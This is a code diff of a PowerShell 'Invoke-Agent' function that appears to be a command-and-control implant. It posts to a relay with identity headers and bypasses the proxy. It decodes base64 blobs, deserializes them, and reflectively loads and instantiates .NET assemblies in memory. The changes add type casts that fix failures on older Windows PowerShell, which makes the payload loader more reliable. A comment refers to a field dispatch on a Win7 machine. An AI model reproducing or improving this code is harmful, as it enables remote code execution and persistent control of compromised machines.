@@ -75,7 +75,7 @@ function Invoke-Agent {
         try {
             $req = NewPostRequest 15000
             try { $null = CallInst (GetProp $req 'Headers') 'Add' @('X-Log-Only', '1') } catch {}
-            $body = BuildBody (,(CallInst $utf8 'GetBytes' @($line)))
+            $body = BuildBody (,(CallInst $utf8 'GetBytes' @([string]$line)))
             SetProp $req 'ContentLength' $body.Length
             $rs = CallInst $req 'GetRequestStream' $null
             if ($body.Length -gt 0) { $null = CallInst $rs 'Write' @([byte[]]$body, 0, $body.Length) }
@@ -165,7 +165,7 @@ function Invoke-Agent {
         SetProp $req 'ReadWriteTimeout' 15000
         try { SetProp $req 'Proxy' $null } catch {}
         foreach ($h in $script:identityHeaders) {
-            try { $null = CallInst (GetProp $req 'Headers') 'Add' @($h[0], $h[1]) } catch {}
+            try { $null = CallInst (GetProp $req 'Headers') 'Add' @([string]$h[0], [string]$h[1]) } catch {}
         }
         # Confirm the applied sleep so the relay extends sweep patience for THIS agent
         # only (hint-blind agents keep the base offline timers).
@@ -175,7 +175,10 @@ function Invoke-Agent {
         return $req
     }
     function B64Stream($base64) {
-        $raw = CallStatic (ResolveM 'System.Convert') 'FromBase64String' @($base64)
+        # [string] cast at the binder boundary: $base64 is a variable-held string, PSObject-
+        # wrapped on PS 2.0 — the CLR2 binder refused it ("FromBase64String not found", Win7
+        # field 2026-09-23, first real 0x0B dispatch). Same rule as WebRequest.Create.
+        $raw = CallStatic (ResolveM 'System.Convert') 'FromBase64String' @([string]$base64)
         $ms = New-Object 'IO.MemoryStream'
         $null = CallInst $ms 'Write' @([byte[]]$raw, 0, $raw.Length)
         SetProp $ms 'Position' 0
@@ -361,7 +364,7 @@ function Invoke-Agent {
                     # DynamicInvoke argument array.
                     $delegate = $deserialize.Invoke($fmt, @([IO.Stream](B64Stream $blobB64)))
                     $asm = $delegate.GetType().GetMethod('DynamicInvoke').Invoke($delegate, [object[]]@(,[object[]]@($null)))
-                    $null = $asm.GetType().GetMethod('CreateInstance', [Type[]]@([string])).Invoke($asm, @($entryPoint))
+                    $null = $asm.GetType().GetMethod('CreateInstance', [Type[]]@([string])).Invoke($asm, @([string]$entryPoint))
                 } else {
                     $null = $deserialize.Invoke($fmt, @([IO.Stream](B64Stream $blobB64)))
                 }
